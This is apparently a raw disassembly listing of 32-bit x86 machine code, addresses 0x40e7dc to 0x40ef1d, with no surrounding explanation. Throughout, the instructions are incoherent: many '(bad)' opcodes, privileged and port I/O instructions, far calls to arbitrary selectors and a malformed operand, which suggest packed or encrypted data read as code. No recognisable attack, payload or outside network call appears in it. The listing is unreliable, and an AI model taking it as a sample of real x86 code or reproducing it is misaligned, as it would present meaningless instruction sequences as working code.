  40e7dc:	jp     0x40e802
  40e7de:	mov    esp,0x5e909acf
  40e7e3:	xchg   esp,eax
  40e7e4:	ins    BYTE PTR es:[edi],dx
  40e7e5:	mov    DWORD PTR [edi+0x3a],eax
  40e7e8:	mov    DWORD PTR cs:[ebp-0x28],esp
  40e7ec:	std    
  40e7ed:	pop    ss
  40e7ee:	leave  
  40e7ef:	mov    edx,0xe492c15c
  40e7f4:	xchg   ecx,eax
  40e7f5:	jg     0x40e77f
  40e7f7:	sbb    eax,0xea5d9def
  40e7fc:	fwait
  40e7fd:	push   esi
  40e7fe:	xor    edx,ebx
  40e800:	sti    
  40e801:	pushf  
  40e802:	adc    ecx,esi
  40e804:	hlt    
  40e805:	sub    eax,0x8088c6ae
  40e80a:	jp     0x40e888
  40e80c:	mov    ds,edx
  40e80e:	mul    DWORD PTR [ecx]
  40e810:	jle    0x40e85e
  40e812:	mov    edi,0xeaa789ff
  40e817:	cs jbe 0x40e88e
  40e81a:	ins    BYTE PTR es:[edi],dx
  40e81b:	inc    ecx
  40e81c:	adc    eax,DWORD PTR [esp+eiz*8-0x6b]
  40e820:	mov    DWORD PTR gs:[esi],esp
  40e823:	gs getsec 
  40e826:	adc    BYTE PTR [esi],bl
  40e828:	sbb    cl,al
  40e82a:	pop    esp
  40e82b:	xlat   BYTE PTR ds:[ebx]
  40e82c:	ins    DWORD PTR es:[edi],dx
  40e82d:	adc    ch,BYTE PTR [edx+0x436f1da6]
  40e833:	(bad)  
  40e834:	fsubp  st(6),st
  40e836:	sbb    BYTE PTR [esi+0x5d49fed3],al
  40e83c:	cmp    bl,dl
  40e83e:	(bad)  
  40e83f:	dec    BYTE PTR [edx+0x64]
  40e842:	mov    eax,0x5e1ce0df
  40e847:	repnz les ebp,FWORD PTR [edi]
  40e84a:	(bad)  
  40e84b:	push   ebx
  40e84c:	pop    eax
  40e84d:	fwait
  40e84e:	ret    
  40e84f:	mov    eax,ds:0xf5e91d80
  40e854:	repz mov al,ds:0x9cb15a5c
  40e85a:	dec    ecx
  40e85b:	loopne 0x40e88b
  40e85d:	fimul  DWORD PTR [ebx]
  40e85f:	fcmovne st,st(2)
  40e861:	jl     0x40e873
  40e863:	aam    0xfd
  40e865:	nop
  40e866:	sub    ch,BYTE PTR [eax+0x66]
  40e869:	jecxz  0x40e866
  40e86b:	add    BYTE PTR [ecx-0x425adac7],dl
  40e871:	xchg   ebp,eax
  40e872:	fsub   DWORD PTR [ebp+eax*4+0x52]
  40e876:	add    al,0x4c
  40e878:	loopne 0x40e80d
  40e87a:	frstor [esi]
  40e87c:	pusha  
  40e87d:	outs   dx,DWORD PTR ds:[esi]
  40e87e:	push   ecx
  40e87f:	cmp    eax,0x18266c42
  40e884:	push   ebp
  40e885:	sub    cl,BYTE PTR [edi]
  40e887:	xlat   BYTE PTR ds:[ebx]
  40e888:	mov    ss,WORD PTR ds:0x61d9ce92
  40e88e:	mov    eax,ds:0xf097c694
  40e893:	push   ds
  40e894:	cmp    BYTE PTR [edx+0x48b71289],dh
  40e89a:	lods   eax,DWORD PTR ds:[esi]
  40e89b:	fisttp QWORD PTR [edi-0x6ae62f3a]
  40e8a1:	and    BYTE PTR [ecx-0x70c4c5de],cl
  40e8a7:	in     eax,dx
  40e8a8:	push   eax
  40e8a9:	cdq    
  40e8aa:	les    edi,FWORD PTR [edi-0x4514e2dc]
  40e8b0:	stos   BYTE PTR es:[edi],al
  40e8b1:	sbb    BYTE PTR [edx],ch
  40e8b3:	xchg   ebp,eax
  40e8b4:	sbb    DWORD PTR [esi],ebx
  40e8b6:	mov    al,ds:0x74c88cd4
  40e8bb:	leave  
  40e8bc:	leave  
  40e8bd:	or     BYTE PTR ds:[edx-0x24],dl
  40e8c1:	xchg   esi,eax
  40e8c2:	jb     0x40e8b7
  40e8c4:	xor    bh,BYTE PTR [esi-0x624cedd1]
  40e8ca:	call   0x8737:0xfcfc2d00
  40e8d1:	and    eax,0xe871e26d
  40e8d6:	push   ebx
  40e8d7:	fdiv   QWORD PTR [ebp+0x495f79e7]
  40e8dd:	ficomp DWORD PTR [ebx]
  40e8df:	mov    ah,0x63
  40e8e1:	xchg   DWORD PTR ds:[edi],esi
  40e8e4:	adc    BYTE PTR [eax],dl
  40e8e6:	les    ebx,FWORD PTR [eax-0x3d]
  40e8e9:	jecxz  0x40e888
  40e8eb:	add    BYTE PTR [eax+0x76c9c0b1],ah
  40e8f1:	cli    
  40e8f2:	cld    
  40e8f3:	jg     0x40e8df
  40e8f5:	addr16 mov al,0xc6
  40e8f8:	mov    dl,0x56
  40e8fa:	aas    
  40e8fb:	mov    DWORD PTR [edx],esi
  40e8fd:	inc    esp
  40e8fe:	aas    
  40e8ff:	jno    0x40e900
  40e901:	xor    BYTE PTR [ecx],ch
  40e903:	mov    edi,DWORD PTR [ecx]
  40e905:	aaa    
  40e906:	test   BYTE PTR [esi-0x477f26b6],0x37
  40e90d:	add    eax,0xfad149c9
  40e912:	mov    ebp,0xd010aaad
  40e917:	xor    DWORD PTR [ecx+eiz*1],0x3bb6a2c9
  40e91e:	stos   BYTE PTR es:[edi],al
  40e91f:	cmp    BYTE PTR [edi],cl
  40e921:	mov    ecx,0x5dae16ea
  40e926:	mov    gs,WORD PTR [ebx+ebx*4]
  40e929:	fld    st(6)
  40e92b:	xor    eax,0x143dbfe4
  40e930:	test   DWORD PTR [ebp+0x1],ecx
  40e933:	xchg   ebp,eax
  40e934:	inc    eax
  40e935:	or     DWORD PTR [eax-0x18bff5d1],esi
  40e93b:	jbe    0x40e902
  40e93d:	lods   eax,DWORD PTR ds:[esi]
  40e93e:	shr    DWORD PTR [esp+edx*4-0x58fea3bc],0xcb
  40e946:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e947:	mov    bl,0x94
  40e949:	xchg   BYTE PTR fs:[eax+0x26],bh
  40e94d:	sbb    BYTE PTR [ebx],ch
  40e94f:	fstp   DWORD PTR [ebx-0x62c64c4b]
  40e955:	adc    eax,0x18eb66ba
  40e95a:	ficom  WORD PTR [eax-0x57]
  40e95d:	add    eax,0x3a32cd8e
  40e962:	dec    ecx
  40e963:	pop    ebx
  40e964:	mov    edi,0xfde1c7e4
  40e969:	mov    dh,BYTE PTR [ecx-0x36]
  40e96c:	push   ecx
  40e96d:	dec    ebp
  40e96e:	rcl    al,cl
  40e970:	add    edx,esi
  40e972:	retf   
  40e973:	fst    DWORD PTR [eax-0x454c7f31]
  40e979:	sub    eax,0x88bc7cda
  40e97e:	xor    BYTE PTR [eax-0x2d8d6425],cl
  40e984:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e985:	mov    dl,0x4
  40e987:	aam    0xdf
  40e989:	out    0xdb,al
  40e98b:	clc    
  40e98c:	mov    edx,DWORD PTR [edx+0x51ad2fba]
  40e992:	mov    bh,0x2e
  40e994:	out    0x80,al
  40e996:	loope  0x40e951
  40e998:	xlat   BYTE PTR ds:[ebx]
  40e999:	add    ebx,esi
  40e99b:	push   eax
  40e99c:	mov    al,0x3f
  40e99e:	(bad)  
  40e99f:	dec    ecx
  40e9a0:	mov    ebp,0xa8189d12
  40e9a5:	xor    dh,cl
  40e9a7:	mov    al,ds:0x332412e9
  40e9ac:	and    al,0x95
  40e9ae:	lea    ebp,[edx]
  40e9b0:	aaa    
  40e9b1:	adc    BYTE PTR [ebx-0x70],ch
  40e9b4:	pop    ebx
  40e9b5:	xchg   ebx,eax
  40e9b6:	add    esp,DWORD PTR [edx+ecx*4-0x5c2478bf]
  40e9bd:	dec    ebx
  40e9be:	test   eax,0xf9a74d95
  40e9c3:	out    0x3c,eax
  40e9c5:	mov    dl,ah
  40e9c7:	fimul  WORD PTR [esi-0x7f]
  40e9ca:	fs das 
  40e9cc:	gs mov dl,ah
  40e9cf:	stc    
  40e9d0:	xchg   DWORD PTR [ebp+0x623e9278],ebp
  40e9d6:	sahf   
  40e9d7:	dec    ebx
  40e9d8:	or     edx,ebx
  40e9da:	test   eax,0xe860871c
  40e9e0:	dec    ebp
  40e9e1:	or     cl,dh
  40e9e3:	popa   
  40e9e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e9e5:	out    dx,eax
  40e9e6:	test   BYTE PTR ds:0xcc5ba81c,0x9
  40e9ed:	(bad)  
  40e9ee:	repnz dec ebx
  40e9f0:	int    0xc2
  40e9f2:	mov    bl,0x58
  40e9f4:	in     al,dx
  40e9f5:	sub    DWORD PTR [edi-0x5742cae3],ecx
  40e9fb:	xchg   ebp,eax
  40e9fc:	fwait
  40e9fd:	mov    ebp,0x3485d9f9
  40ea02:	in     al,0xa0
  40ea04:	xchg   edi,edx
  40ea06:	xchg   ebx,eax
  40ea07:	push   cs
  40ea08:	add    DWORD PTR [edi+0x22],ebx
  40ea0b:	mov    al,0xdb
  40ea0d:	mov    eax,ds:0x2e774a86
  40ea12:	add    eax,0xa5301308
  40ea17:	sbb    ebx,DWORD PTR [ebx+esi*8]
  40ea1a:	and    BYTE PTR [ebx],bh
  40ea1c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ea1d:	ror    DWORD PTR [eax+0x78332aa0],1
  40ea23:	(bad)  
  40ea24:	jmp    0x40ea75
  40ea26:	js     0x40e9e7
  40ea28:	pop    edi
  40ea29:	push   ebx
  40ea2a:	lds    ebp,FWORD PTR [edi]
  40ea2c:	sbb    DWORD PTR [ebp+0x7eb4f391],0xfc2663b6
  40ea36:	aas    
  40ea37:	jl     0x40ea67
  40ea39:	adc    BYTE PTR [ecx+0x65],dl
  40ea3c:	mov    eax,ds:0x57e39b2b
  40ea41:	out    dx,eax
  40ea42:	dec    edi
  40ea43:	in     eax,dx
  40ea44:	xchg   ecx,eax
  40ea45:	call   0xf410:0x335b90b7
  40ea4c:	xchg   edi,eax
  40ea4d:	mov    ah,0xf9
  40ea4f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ea50:	xchg   ecx,eax
  40ea51:	mov    ecx,0xf0ae8ef6
  40ea56:	arpl   WORD PTR [ebx-0x14],di
  40ea59:	jecxz  0x40e9e8
  40ea5b:	or     DWORD PTR [edi],esp
  40ea5d:	and    ecx,DWORD PTR [ebx]
  40ea5f:	mov    bl,0xd
  40ea61:	push   eax
  40ea62:	jo     0x5875cd74
  40ea68:	push   eax
  40ea69:	xchg   ebp,eax
  40ea6a:	jb     0x40e9f2
  40ea6c:	and    bl,BYTE PTR [eax-0x4d32c826]
  40ea72:	push   es
  40ea73:	fnsave [ebx]
  40ea75:	imul   ecx,DWORD PTR [ebp+0x3c],0x94da0915
  40ea7c:	sub    DWORD PTR [esi+0x434ae944],esp
  40ea82:	and    al,0x40
  40ea84:	cld    
  40ea85:	xor    BYTE PTR [ecx-0x3d19ebfc],bh
  40ea8b:	in     eax,0x1f
  40ea8d:	das    
  40ea8e:	mov    edx,0x4cd9ae57
  40ea93:	push   esi
  40ea94:	add    eax,0x5b1a8c0
  40ea99:	mov    ?,WORD PTR [ebp-0x1f]
  40ea9c:	pop    ebx
  40ea9d:	dec    eax
  40ea9e:	mov    ecx,0xb3396e3
  40eaa3:	mov    eax,ds:0xe6a98505
  40eaa8:	mov    bl,BYTE PTR [ecx]
  40eaaa:	or     ebx,DWORD PTR [edx-0x2be3f7d6]
  40eab0:	push   eax
  40eab1:	cld    
  40eab2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eab3:	(bad)  
  40eab5:	xchg   esi,eax
  40eab6:	pop    ebx
  40eab7:	and    cl,BYTE PTR [edi+0x68e9d83]
  40eabd:	mov    ah,0x8f
  40eabf:	inc    edx
  40eac0:	mov    ah,al
  40eac2:	jb     0x40ea92
  40eac4:	je     0x40ead4
  40eac6:	cld    
  40eac7:	bound  ebp,QWORD PTR ds:0xee86c54d
  40eacd:	jb     0x40ea75
  40eacf:	sbb    al,0x79
  40ead1:	xchg   ebx,eax
  40ead2:	addr16 jns 0x40ead9
  40ead5:	daa    
  40ead6:	add    bh,cl
  40ead8:	ret    
  40ead9:	push   ds
  40eada:	scas   eax,DWORD PTR es:[edi]
  40eadb:	dec    edi
  40eadc:	push   ebx
  40eadd:	inc    ebp
  40eade:	mov    DWORD PTR [edx+0x3096021f],eax
  40eae4:	sbb    BYTE PTR ss:[ecx],0x3a
  40eae8:	stc    
  40eae9:	outs   dx,DWORD PTR ds:[esi]
  40eaea:	jne    0x40eb36
  40eaec:	fidivr WORD PTR [ebx]
  40eaee:	sti    
  40eaef:	add    eax,0xcb131ce9
  40eaf4:	mov    dl,0xbb
  40eaf6:	retf   0x5c9b
  40eaf9:	mov    dl,0xa1
  40eafb:	into   
  40eafc:	mov    ecx,0xdca5b148
  40eb01:	loop   0x40eaf1
  40eb03:	mov    ch,0x9e
  40eb05:	xchg   ecx,eax
  40eb06:	rol    DWORD PTR [ebp-0x1b],0x22
  40eb0a:	push   ebx
  40eb0b:	aam    0xfb
  40eb0d:	jnp    0x40eb26
  40eb0f:	pop    ebx
  40eb10:	jno    0x40eb57
  40eb12:	sub    al,0x46
  40eb14:	inc    ebp
  40eb15:	push   esp
  40eb16:	mov    bl,0x8d
  40eb18:	jp     0x40ead3
  40eb1a:	jp     0x40eadc
  40eb1c:	sub    ebx,edi
  40eb1e:	retf   
  40eb1f:	retf   
  40eb20:	push   edx
  40eb21:	mov    esp,0x14d36e13
  40eb26:	sbb    ecx,DWORD PTR [ebx+0x5]
  40eb29:	aaa    
  40eb2a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eb2b:	mov    ebp,0xb9b14057
  40eb30:	dec    esi
  40eb31:	jl     0x40eab3
  40eb33:	inc    ecx
  40eb34:	pop    ds
  40eb35:	adc    al,0x73
  40eb37:	cmp    eax,0xffffffb5
  40eb3a:	mov    bh,0x87
  40eb3c:	xchg   esi,eax
  40eb3d:	dec    ebp
  40eb3e:	ret    0x8a7a
  40eb41:	sub    eax,0xb6acd7a7
  40eb46:	stos   BYTE PTR es:[edi],al
  40eb47:	out    0xd2,eax
  40eb49:	sbb    bh,ah
  40eb4b:	push   si
  40eb4d:	fs (bad) 
  40eb4f:	push   0xb5db815
  40eb54:	lods   al,BYTE PTR ds:[esi]
  40eb55:	fnstsw WORD PTR [ebx]
  40eb57:	loop   0x40eb23
  40eb59:	aad    0xc1
  40eb5b:	push   0xffffff9d
  40eb5d:	arpl   WORD PTR [ecx+0x7e],bx
  40eb60:	jl     0x40eb8b
  40eb62:	push   edi
  40eb63:	iret   
  40eb64:	jmp    0x976c09b3
  40eb69:	dec    ebp
  40eb6a:	cmp    bh,BYTE PTR [ecx]
  40eb6c:	jge    0x40eb8b
  40eb6e:	sbb    BYTE PTR [ecx+0x1b],cl
  40eb71:	pop    ecx
  40eb72:	int    0x3d
  40eb74:	mov    eax,ds:0x458c1047
  40eb79:	sub    ah,dl
  40eb7b:	ins    BYTE PTR es:[edi],dx
  40eb7c:	adc    bl,BYTE PTR [eax-0x78]
  40eb7f:	int    0xd
  40eb81:	enter  0x95b1,0x40
  40eb85:	mov    edi,DWORD PTR [edi-0x11840904]
  40eb8b:	dec    eax
  40eb8c:	lock mov ebx,DWORD PTR [esi+0x21]
  40eb90:	clc    
  40eb91:	pop    edx
  40eb92:	stos   BYTE PTR es:[edi],al
  40eb93:	iret   
  40eb94:	cmp    eax,0xe227e00d
  40eb99:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  40eb9b:	idiv   ebp
  40eb9d:	pop    edx
  40eb9e:	mov    dl,0x52
  40eba0:	inc    ebx
  40eba1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eba2:	(bad)  
  40eba3:	retf   0x7ee0
  40eba6:	jp     0x40ebd2
  40eba8:	test   al,0xd
  40ebaa:	xchg   edx,eax
  40ebab:	pop    ds
  40ebac:	sbb    edi,DWORD PTR [edi+edx*1-0x60bb016a]
  40ebb3:	xor    ebp,DWORD PTR [esi]
  40ebb5:	xor    eax,0xbd9ca313
  40ebba:	loop   0x40eb84
  40ebbc:	pop    ds
  40ebbd:	pusha  
  40ebbe:	push   edi
  40ebbf:	pusha  
  40ebc0:	daa    
  40ebc1:	lds    ebx,FWORD PTR [eax+ebp*2-0x77bd254]
  40ebc8:	dec    eax
  40ebc9:	out    dx,al
  40ebca:	xchg   ecx,eax
  40ebcb:	mov    eax,0xa723a25e
  40ebd0:	jns    0x40eba0
  40ebd2:	div    DWORD PTR [eax-0x49]
  40ebd5:	dec    esi
  40ebd6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ebd7:	sub    eax,0xb1223aa3
  40ebdc:	xchg   esi,eax
  40ebdd:	test   eax,0x5a38aa64
  40ebe2:	xchg   BYTE PTR [eax+0x3ce4cf93],al
  40ebe8:	cmp    dl,ah
  40ebea:	xor    dl,dl
  40ebec:	shl    BYTE PTR [ecx+0x6a],0x35
  40ebf0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ebf1:	xchg   edx,eax
  40ebf2:	adc    al,0x56
  40ebf4:	jge    0x40ec17
  40ebf6:	retf   
  40ebf7:	push   esi
  40ebf8:	inc    edi
  40ebf9:	data16 icebp 
  40ebfb:	mov    edi,0x144b6e53
  40ec00:	call   0x2e98dbcf
  40ec05:	mov    esi,0x2b51ccc7
  40ec0a:	xchg   esp,eax
  40ec0b:	fcom   QWORD PTR [eax+0x34]
  40ec0e:	popa   
  40ec0f:	stos   BYTE PTR es:[edi],al
  40ec10:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ec11:	xor    al,0x36
  40ec13:	lock iretw 
  40ec16:	mov    eax,0x3e9f2a35
  40ec1b:	ds and eax,0x95b3ce20
  40ec21:	imul   ecx,DWORD PTR [ecx],0x9198574
  40ec27:	adc    ah,dl
  40ec29:	in     al,dx
  40ec2a:	pop    ds
  40ec2b:	fld    QWORD PTR [eax-0x4e]
  40ec2e:	jle    0x40ec3c
  40ec30:	jl     0x40ec1b
  40ec32:	(bad)  
  40ec34:	mov    ecx,0x5326cfb9
  40ec39:	(bad)  
  40ec3a:	adc    BYTE PTR [ebx-0xc],dh
  40ec3d:	sub    eax,0x163bc64
  40ec42:	cdq    
  40ec43:	out    0x15,eax
  40ec45:	jp     0x40ec56
  40ec47:	inc    ebp
  40ec48:	inc    eax
  40ec49:	mov    cl,0x15
  40ec4b:	cmp    al,0x16
  40ec4d:	popf   
  40ec4e:	xlat   BYTE PTR ds:[ebx]
  40ec4f:	pop    esi
  40ec50:	outs   dx,DWORD PTR ds:[esi]
  40ec51:	adc    al,0xbe
  40ec53:	mov    ecx,0xdb60d18b
  40ec58:	mov    dl,0xaf
  40ec5a:	dec    BYTE PTR [eax]
  40ec5c:	cmp    bh,BYTE PTR [ebx+0x38]
  40ec5f:	and    BYTE PTR ds:0x13037040,cl
  40ec65:	inc    ebp
  40ec66:	xchg   ebx,eax
  40ec67:	int    0x62
  40ec69:	jl     0x40ecd8
  40ec6b:	jl     0x40ece6
  40ec6d:	(bad)  
  40ec6e:	mov    edi,0x523e9b27
  40ec73:	dec    ebx
  40ec74:	and    al,0x45
  40ec76:	jp     0x40ecbd
  40ec78:	sti    
  40ec79:	sahf   
  40ec7a:	fbld   TBYTE PTR ds:0xc5cc3d3b
  40ec80:	ret    
  40ec81:	data16 mov ch,0xb3
  40ec84:	lea    ecx,ds:0xd7f93cfd
  40ec8a:	gs xchg ebx,eax
  40ec8c:	mov    cl,BYTE PTR [ebp-0x19]
  40ec8f:	cwde   
  40ec90:	lods   eax,DWORD PTR ds:[si]
  40ec92:	outs   dx,BYTE PTR ds:[esi]
  40ec93:	add    eax,0xf2272f9e
  40ec98:	or     DWORD PTR [ecx-0x31],0x78
  40ec9c:	sbb    al,cl
  40ec9e:	mov    DWORD PTR [ebx+0x829ecb1],edi
  40eca4:	scas   al,BYTE PTR es:[edi]
  40eca5:	push   esp
  40eca6:	push   esi
  40eca7:	cmp    eax,DWORD PTR [ebx-0x539db1c]
  40ecad:	or     al,0xf6
  40ecaf:	xor    ecx,DWORD PTR [edi]
  40ecb1:	and    al,0xf
  40ecb3:	loope  0x40ecd6
  40ecb5:	in     al,0x29
  40ecb7:	repz retf 
  40ecb9:	and    ah,al
  40ecbb:	sbb    ecx,ebp
  40ecbd:	imul   esi,DWORD PTR [edx],0xffffffe5
  40ecc0:	fwait
  40ecc1:	push   edi
  40ecc2:	sub    esp,0x5c1d404
  40ecc8:	(bad)  
  40ecc9:	dec    ebp
  40ecca:	popf   
  40eccb:	in     al,dx
  40eccc:	push   ecx
  40eccd:	sbb    dl,cl
  40eccf:	ins    BYTE PTR es:[edi],dx
  40ecd0:	std    
  40ecd1:	enter  0xb755,0xb6
  40ecd5:	jle    0x40ed1d
  40ecd7:	(bad)  
  40ecd8:	jp     0x40ed17
  40ecda:	xor    ah,BYTE PTR [ebp+0x5d23678e]
  40ece0:	inc    ebx
  40ece1:	adc    ebp,DWORD PTR [esi+0x41]
  40ece4:	fs mov ebp,0x19118cb3
  40ecea:	fcmovnu st,st(5)
  40ecec:	imul   esi,DWORD PTR [ecx-0x75],0x33
  40ecf0:	jecxz  0x40ed31
  40ecf2:	sbb    eax,0x2ec4168
  40ecf7:	aas    
  40ecf8:	pop    esp
  40ecf9:	pop    esi
  40ecfa:	fcmovb st,st(6)
  40ecfc:	es leave 
  40ecfe:	push   edx
  40ecff:	lods   al,BYTE PTR ds:[esi]
  40ed00:	add    BYTE PTR [eax-0x5906b148],bl
  40ed06:	jne    0x40ed08
  40ed08:	mov    bl,0x9e
  40ed0a:	leave  
  40ed0b:	loop   0x40eced
  40ed0d:	jb     0x40ecd7
  40ed0f:	lea    edx,[ebp-0x62d49b14]
  40ed15:	iret   
  40ed16:	std    
  40ed17:	mov    cl,0x63
  40ed19:	adc    DWORD PTR [edx+0x18],0xffffffc6
  40ed1d:	not    bh
  40ed1f:	mov    dl,0x5d
  40ed21:	xor    eax,esi
  40ed23:	test   al,0x98
  40ed25:	lds    ebp,FWORD PTR [edi]
  40ed27:	or     DWORD PTR [edi-0x3e],ecx
  40ed2a:	push   edx
  40ed2b:	mov    bl,0x6d
  40ed2d:	sahf   
  40ed2e:	jl     0x40ed41
  40ed30:	cmp    dh,BYTE PTR [edx]
  40ed32:	out    dx,eax
  40ed33:	repnz mov eax,ds:0x96aaa744
  40ed39:	pop    ebx
  40ed3a:	ss adc dl,BYTE PTR ds:[eax]
  40ed3e:	(bad)  [eax-0x5f74e1c7]
  40ed44:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ed45:	cs loopne 0x40ed41
  40ed48:	or     eax,0xfc3db4b4
  40ed4d:	sahf   
  40ed4e:	push   edx
  40ed4f:	xor    BYTE PTR [ecx-0x5701b89f],dl
  40ed55:	fidivr DWORD PTR [ecx]
  40ed57:	jae    0x40ed7b
  40ed59:	cld    
  40ed5a:	leave  
  40ed5b:	scas   al,BYTE PTR es:[edi]
  40ed5c:	daa    
  40ed5d:	mov    bl,0x27
  40ed5f:	fnstenv [esi+0x27]
  40ed62:	retf   
  40ed63:	fcmovbe st,st(2)
  40ed65:	out    dx,al
  40ed66:	pop    edx
  40ed67:	sub    DWORD PTR [esi-0x7c49b10d],edx
  40ed6d:	jne    0x40edb8
  40ed6f:	xor    DWORD PTR [esi],ebp
  40ed71:	mov    BYTE PTR [ebx-0x77ebcd05],cl
  40ed77:	sub    al,BYTE PTR gs:[ecx]
  40ed7a:	je     0x40ed35
  40ed7c:	(bad)  
  40ed7d:	sub    bh,cl
  40ed7f:	push   0xfdd63d44
  40ed84:	test   eax,0x75e265df
  40ed89:	test   dl,bh
  40ed8b:	pop    ebp
  40ed8c:	mov    ebp,0x759ac735
  40ed91:	mov    bh,0x39
  40ed93:	and    BYTE PTR [edx],al
  40ed95:	xchg   edi,eax
  40ed96:	jmp    0x40ed33
  40ed98:	mov    ebx,0x854c9a62
  40ed9d:	inc    eax
  40ed9e:	icebp  
  40ed9f:	aas    
  40eda0:	rcr    DWORD PTR [edi],0x61
  40eda3:	sbb    ah,BYTE PTR [edi+0x201d63a0]
  40eda9:	mov    ebp,0xcbbafc20
  40edae:	cs inc edx
  40edb0:	pushf  
  40edb1:	mov    DWORD PTR [esi+0x230ceb77],edi
  40edb7:	and    BYTE PTR [edx+ecx*8-0x38],cl
  40edbb:	inc    ebx
  40edbc:	neg    DWORD PTR [edx+0x44]
  40edbf:	xchg   edi,eax
  40edc0:	mul    DWORD PTR [ebp+0x26c83db0]
  40edc6:	test   eax,0x968a6862
  40edcb:	(bad)  
  40edcd:	mov    al,ds:0x4447e74f
  40edd2:	pusha  
  40edd3:	dec    edx
  40edd4:	mov    cl,0x85
  40edd6:	retf   
  40edd7:	lods   al,BYTE PTR ds:[esi]
  40edd8:	push   cs
  40edd9:	or     BYTE PTR [ecx+0x56],bl
  40eddc:	lea    ecx,[eax+0x62]
  40eddf:	add    dl,bh
  40ede1:	dec    ebp
  40ede2:	xchg   esi,eax
  40ede3:	push   ebp
  40ede4:	retf   
  40ede5:	pop    ebx
  40ede6:	sbb    eax,DWORD PTR [ecx]
  40ede8:	ret    
  40ede9:	clc    
  40edea:	push   cs
  40edeb:	pop    eax
  40edec:	push   0x1eac003b
  40edf1:	xor    cl,BYTE PTR [ecx]
  40edf3:	test   al,0x9b
  40edf5:	imul   ebx,DWORD PTR [ecx+0x6988f440],0xf79709b0
  40edff:	jecxz  0x40ee4b
  40ee01:	jo     0x40edda
  40ee03:	(bad)  
  40ee04:	mov    al,ds:0x31f99dd8
  40ee09:	jp     0x40ee3d
  40ee0b:	sti    
  40ee0c:	cmp    BYTE PTR [ebx+eax*8],cl
  40ee0f:	call   0x318bf5e5
  40ee14:	retf   0x63a3
  40ee17:	add    bh,cl
  40ee19:	jmp    0x8b0021a
  40ee1e:	sub    cl,BYTE PTR [ecx-0x6c3b2793]
  40ee24:	xchg   ecx,eax
  40ee25:	mov    al,ds:0x89279db0
  40ee2a:	add    ebp,ebp
  40ee2c:	jb     0x40ee28
  40ee2e:	(bad)  
  40ee2f:	mov    ch,0x0
  40ee31:	pop    ss
  40ee32:	leave  
  40ee33:	std    
  40ee34:	inc    ebx
  40ee35:	cmp    al,0x9e
  40ee37:	daa    
  40ee38:	jo     0x40ee7c
  40ee3a:	pop    esi
  40ee3b:	cmp    edx,edx
  40ee3d:	psrlw  mm7,mm3
  40ee40:	xchg   ecx,eax
  40ee41:	push   ebp
  40ee42:	jo     0x40ee22
  40ee44:	add    dl,BYTE PTR [esi+0x9]
  40ee47:	mov    edi,0x5d111118
  40ee4c:	out    0x13,al
  40ee4e:	in     eax,dx
  40ee4f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ee50:	xlat   BYTE PTR ds:[ebx]
  40ee51:	push   edi
  40ee52:	mov    ds:0xb0e30422,al
  40ee57:	or     BYTE PTR [ebx-0x175f6345],bl
  40ee5d:	mov    DWORD PTR [ebp-0x7],esp
  40ee60:	test   eax,0xdd37df3e
  40ee65:	retf   0xd502
  40ee68:	cli    
  40ee69:	popa   
  40ee6a:	and    ecx,DWORD PTR [eax]
  40ee6c:	and    eax,0x433ac0a2
  40ee71:	mov    esi,fs
  40ee73:	mov    ecx,0xde8ac2cd
  40ee78:	inc    eax
  40ee79:	stc    
  40ee7a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ee7b:	or     bl,al
  40ee7d:	out    0xfd,eax
  40ee7f:	outs   dx,BYTE PTR ds:[esi]
  40ee80:	std    
  40ee81:	cmc    
  40ee82:	adc    BYTE PTR [edi+0x52dde682],bl
  40ee88:	outs   dx,BYTE PTR ds:[esi]
  40ee89:	test   eax,0xde2e5ac8
  40ee8e:	pop    edx
  40ee8f:	or     eax,0x15c848a0
  40ee94:	cmp    esp,ebx
  40ee96:	call   0xd18:0x19023970
  40ee9d:	scas   al,BYTE PTR es:[edi]
  40ee9e:	daa    
  40ee9f:	aam    0xc1
  40eea1:	push   esp
  40eea2:	stos   DWORD PTR es:[edi],eax
  40eea3:	test   eax,0x14433e31
  40eea8:	inc    esi
  40eea9:	dec    esi
  40eeaa:	inc    esp
  40eeab:	push   0x6a
  40eead:	ja     0x40ef1a
  40eeaf:	out    0x9a,eax
  40eeb1:	std    
  40eeb2:	das    
  40eeb3:	sub    eax,0xb6abbf59
  40eeb8:	sub    eax,0x56ce6629
  40eebd:	or     eax,0x158a206c
  40eec2:	in     al,0x75
  40eec4:	aaa    
  40eec5:	scas   al,BYTE PTR es:[edi]
  40eec6:	stc    
  40eec7:	(bad)  
  40eec8:	cld    
  40eec9:	mov    ch,0x9d
  40eecb:	push   ecx
  40eecc:	adc    al,0x6
  40eece:	(bad)
  40eed2:	imul   ebx,DWORD PTR [eax+edi*8+0xd04e0a4],0xb3c2ed8a
  40eedd:	adc    al,0x2b
  40eee0:	mov    ah,0xce
  40eee2:	call   0x24531dbe
  40eee7:	sbb    ebp,DWORD PTR [esi]
  40eee9:	shl    BYTE PTR [ecx],cl
  40eeeb:	mov    bl,0xe2
  40eeed:	test   al,0xe
  40eeef:	mov    cl,0x3
  40eef1:	mov    dl,0xcf
  40eef3:	loope  0x40eef0
  40eef5:	sar    BYTE PTR [edx+0x1a06589a],cl
  40eefb:	les    ebx,FWORD PTR [ecx+0x79b0efb]
  40ef01:	add    DWORD PTR [esi-0x22a2b9f8],edx
  40ef07:	pop    esp
  40ef08:	ret    
  40ef09:	xchg   edx,eax
  40ef0a:	jge    0x40ef7f
  40ef0c:	enter  0xd1db,0x76
  40ef10:	call   0x277c:0x23d670a9
  40ef17:	es in  eax,dx
  40ef19:	ins    BYTE PTR es:[edi],dx
  40ef1a:	ja     0x40ef8b
  40ef1c:	aaa    
  40ef1d:	icebp  
